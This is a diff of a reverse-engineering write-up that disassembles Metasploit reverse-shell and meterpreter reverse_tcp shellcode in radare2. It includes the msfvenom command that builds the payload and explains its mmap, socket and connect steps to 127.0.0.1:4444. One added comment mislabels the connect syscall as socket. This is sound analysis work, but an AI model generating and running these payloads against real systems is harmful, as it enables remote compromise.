@@ -253,7 +253,7 @@ If we didn't have that information we could still figure out the variables. From
 Now the shellcode prepares to call `connect`. The first argument is the file descriptor returned by `socket`. Then there's a `jmp` followed by a `call` and a `pop`. This `call` is basically placing the address `0x004000b6` on the stack which then is popped into RSI, the second argument. So this means the bytes after `call` are in fact the `struct sockaddr` for which a pointer is passed as the second argument to `connect`.
 
     connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
- 
+
         0x00400085      50             push rax         ; fd returned by `socket`
         0x00400086      5f             pop rdi
     ,=< 0x00400087      eb28           jmp 0x4000b1
@@ -307,7 +307,7 @@ And finally a stack based `execve` is called. RSI is `0x0` after the previous in
 
     execve(const char *pathname, char *const argv[], char *const envp[])
 
-    0x0040009e      6a3b           push 0x3b                      ; __NR_connect = 0x3b = 59
+    0x0040009e      6a3b           push 0x3b                      ; __NR_execve = 0x3b = 59
     0x004000a0      58             pop rax
     0x004000a1      99             cdq                            ; rdx = 0
     0x004000a2      48bb2f62696e.  movabs rbx, 0x68732f6e69622f   ; '/bin/sh'
@@ -316,8 +316,148 @@ And finally a stack based `execve` is called. RSI is `0x0` after the previous in
     0x004000ae      5f             pop rdi
     0x004000af      0f05           syscall
 
+
+linux/x64/meterpreter/reverse_tcp
+---------------------------------
+
+    $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf > linux-x64-meterpreter-reverse_tcp
+    $ ./linux/x64/meterpreter/reverse_tcp
+
+
+    $ r2 -d linux-x64-meterpreter-reverse_tcp
+     -- Welcome to IDA 10.0.
+    [0x00400078]> af
+    [0x00400078]> pdf
+                ;-- rip:
+    / (fcn) entry0 129
+    |   entry0 (int32_t arg3);
+    |           ; arg int32_t arg3 @ rdx
+    |           0x00400078      4831ff         xor rdi, rdi
+    |           0x0040007b      6a09           push 9                      ; 9
+    |           0x0040007d      58             pop rax
+    |           0x0040007e      99             cdq
+    |           0x0040007f      b610           mov dh, 0x10                ; 16
+    |           0x00400081      4889d6         mov rsi, rdx                ; arg3
+    |           0x00400084      4d31c9         xor r9, r9
+    |           0x00400087      6a22           push 0x22                   ; '"' ; 34
+    |           0x00400089      415a           pop r10
+    |           0x0040008b      b207           mov dl, 7
+    |           0x0040008d      0f05           syscall
+    |           0x0040008f      4885c0         test rax, rax
+    |       ,=< 0x00400092      7852           js 0x4000e6
+    |       |   0x00400094      6a0a           push 0xa                    ; 10
+    |       |   0x00400096      4159           pop r9
+    |       |   0x00400098      56             push rsi
+    |       |   0x00400099      50             push rax
+    |       |   0x0040009a      6a29           push 0x29                   ; ')' ; 41
+    |       |   0x0040009c      58             pop rax
+    |       |   0x0040009d      99             cdq
+    |       |   0x0040009e      6a02           push 2                      ; 2
+    |       |   0x004000a0      5f             pop rdi
+    |       |   0x004000a1      6a01           push 1                      ; 1
+    |       |   0x004000a3      5e             pop rsi
+    |       |   0x004000a4      0f05           syscall
+    |       |   0x004000a6      4885c0         test rax, rax
+    |      ,==< 0x004000a9      783b           js 0x4000e6
+    |      ||   0x004000ab      4897           xchg rax, rdi
+    |     .---> 0x004000ad      48b90200115c.  movabs rcx, 0x100007f5c110002
+    |     :||   0x004000b7      51             push rcx
+    |     :||   0x004000b8      4889e6         mov rsi, rsp
+    |     :||   0x004000bb      6a10           push 0x10                   ; 16
+    |     :||   0x004000bd      5a             pop rdx
+    |     :||   0x004000be      6a2a           push 0x2a                   ; '*' ; 42
+    |     :||   0x004000c0      58             pop rax
+    |     :||   0x004000c1      0f05           syscall
+    |     :||   0x004000c3      59             pop rcx
+    |     :||   0x004000c4      4885c0         test rax, rax
+    |    ,====< 0x004000c7      7925           jns 0x4000ee
+    |    |:||   0x004000c9      49ffc9         dec r9
+    |   ,=====< 0x004000cc      7418           je 0x4000e6
+    |   ||:||   0x004000ce      57             push rdi
+    |   ||:||   0x004000cf      6a23           push 0x23                   ; '#' ; 35
+    |   ||:||   0x004000d1      58             pop rax
+    |   ||:||   0x004000d2      6a00           push 0
+    |   ||:||   0x004000d4      6a05           push 5                      ; 5
+    |   ||:||   0x004000d6      4889e7         mov rdi, rsp
+    |   ||:||   0x004000d9      4831f6         xor rsi, rsi
+    |   ||:||   0x004000dc      0f05           syscall
+    |   ||:||   0x004000de      59             pop rcx
+    |   ||:||   0x004000df      59             pop rcx
+    |   ||:||   0x004000e0      5f             pop rdi
+    |   ||:||   0x004000e1      4885c0         test rax, rax
+    |   ||`===< 0x004000e4      79c7           jns 0x4000ad
+    |   `-.``-> 0x004000e6      6a3c           push 0x3c                   ; '<' ; 60
+    |    |:     0x004000e8      58             pop rax
+    |    |:     0x004000e9      6a01           push 1                      ; 1
+    |    |:     0x004000eb      5f             pop rdi
+    |    |:     0x004000ec      0f05           syscall
+    |    `----> 0x004000ee      5e             pop rsi
+    |     :     0x004000ef      5a             pop rdx
+    |     :     0x004000f0      0f05           syscall
+    |     :     0x004000f2      4885c0         test rax, rax
+    |     `===< 0x004000f5      78ef           js 0x4000e6
+    \           0x004000f7      ffe6           jmp rsi
+
+RAX is set to 9, which corresponds to [`mmap`][man_2_mmap], which purpose is to "map or unmap files or devices into memory". The first argument is `NULL` so the kernel chooses the address at which to create the mapping. The second argument is the length of the mapping, which here is 4 kB. The third arguemnt is the memory protection for the mapping. By looking at `/usr/include/asm-generic/mman-common.h` we know this mapping has `PROT_READ`, `PROT_WRITE` and `PROT_EXEC`, so basically full permissions which corresponds to `0x7`. I'm not sure why `0x1007` is being used instead. Maybe not clearing RDX is an optimisation because the syscall doesn't look into higher bytes of RDX.
+
+The fourth argument is `0x22` which looking at `/usr/include/asm-generic/mman-common.h` and `/usr/include/linux/mman.h` we find to be `MAP_ANONYMOUS|MAP_PRIVATE`. Since `MAP_ANONYMOUS` is used `fd` is ignored (according to the manual) so you can notice R8 is not initialised. And finally the last argument, the offset, is set to zero. At this point I have no idea what this mapping will be used for. Note that on failure `mmap` returns -1 and the shellcode checks for that and calls `exit` in that event.
+
+    void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off)
+
+        0x00400078      4831ff         xor rdi, rdi                ; rdi = null  (arg1)
+        0x0040007b      6a09           push 9                      ; __NR_mmap = 9
+        0x0040007d      58             pop rax
+        0x0040007e      99             cdq                         ; rdx = 0
+        0x0040007f      b610           mov dh, 0x10                ; rdx = 0x1000
+        0x00400081      4889d6         mov rsi, rdx                ; rsi = 4096  (arg2)
+        0x00400084      4d31c9         xor r9, r9                  ; arg6 = 0
+        0x00400087      6a22           push 0x22                   ; MAP_ANONYMOUS|MAP_PRIVATE
+        0x00400089      415a           pop r10
+        0x0040008b      b207           mov dl, 7                   ; rdx = 0x1007 = 0x1000 | 0x7  (RWX|0x1000)
+        0x0040008d      0f05           syscall
+        0x0040008f      4885c0         test rax, rax
+    ,=< 0x00400092      7852           js 0x4000e6
+    |   ...
+    `-> 0x004000e6      6a3c           push 0x3c                   ; __NR_exit = 0x3c = 60
+        0x004000e8      58             pop rax
+        0x004000e9      6a01           push 1
+        0x004000eb      5f             pop rdi
+        0x004000ec      0f05           syscall
+
+Do you recognise the next instructions? It's a `socket` for IPv4, very similar to the one we saw in the section before. However, among these instructions there are some pushes to the stack with values that are not used for now. `socket`'s return value is saved into RDI.
+
+    0x00400094      6a0a           push 0xa
+    0x00400096      4159           pop r9                      ; r9 = 10  (will be used later?)
+    0x00400098      56             push rsi                    ; saving 4096 for later
+    0x00400099      50             push rax                    ; saving `mmap`'s return address for later
+    0x0040009a      6a29           push 0x29                   ; __NR_socket = 0x29 = 41
+    0x0040009c      58             pop rax
+    0x0040009d      99             cdq
+    0x0040009e      6a02           push 2                      ; AF_INET
+    0x004000a0      5f             pop rdi
+    0x004000a1      6a01           push 1                      ; SOCK_STREAM
+    0x004000a3      5e             pop rsi
+    0x004000a4      0f05           syscall
+    0x004000a6      4885c0         test rax, rax
+    0x004000a9      783b           js 0x4000e6                 ; exit
+    0x004000ab      4897           xchg rax, rdi
+
+And now we have a `connect` to `127.0.0.1:4444`. The entire `sockaddr_in` structure is moved into RCX and pushed into the stack. Once again refer to [Beej's Guide to Network Programming][beej_sockaddr_in].
+
+    0x004000ad      48b90200115c.  movabs rcx, 0x100007f5c110002   ; sin_zero[8], 127.0.0.1:4444, AF_INET
+    0x004000b7      51             push rcx
+    0x004000b8      4889e6         mov rsi, rsp
+    0x004000bb      6a10           push 0x10                       ; sizeof(sockaddr_in)
+    0x004000bd      5a             pop rdx
+    0x004000be      6a2a           push 0x2a                       ; __NR_socket = 0x29 = 41
+    0x004000c0      58             pop rax
+    0x004000c1      0f05           syscall
+    0x004000c3      59             pop rcx                         ; pop the sockaddr_in structure
+
+
 [man_2_execve]: https://linux.die.net/man/2/execve
 [man_2_socket]: https://linux.die.net/man/2/socket
+[man_2_mmap]: https://linux.die.net/man/2/mmap
 [wikipedia_radare2]: https://en.wikipedia.org/wiki/Radare2
 [beej_sockaddr_in]: https://web.archive.org/web/20190202184104/https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
 
